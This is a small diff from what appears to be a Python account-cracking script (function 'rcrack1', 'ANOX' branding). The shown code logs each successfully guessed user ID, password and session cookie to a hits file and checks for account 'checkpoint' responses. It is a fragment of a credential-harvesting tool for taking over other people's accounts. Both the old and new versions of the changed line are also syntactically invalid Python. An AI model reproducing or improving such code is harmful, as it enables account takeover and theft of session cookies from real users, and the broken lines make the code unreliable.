@@ -255,7 +255,7 @@ def rcrack1(uid,pwx,tl):
                 cid = coki[7:22]
                 print(f"\033[38;5;46m[ANOX-OK🌻] {uid}|{ps}")
                 print(f"\n[COOKIE✅️] : {coki}")
-                open('/sdcard/ANOX911/ok.txt', 'a').write( uid+' | '+ps+'|' coki'\n')
+                open('/sdcard/ANOX911/ok.txt', 'a').write( uid+' | '+ps+'|' {coki}\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
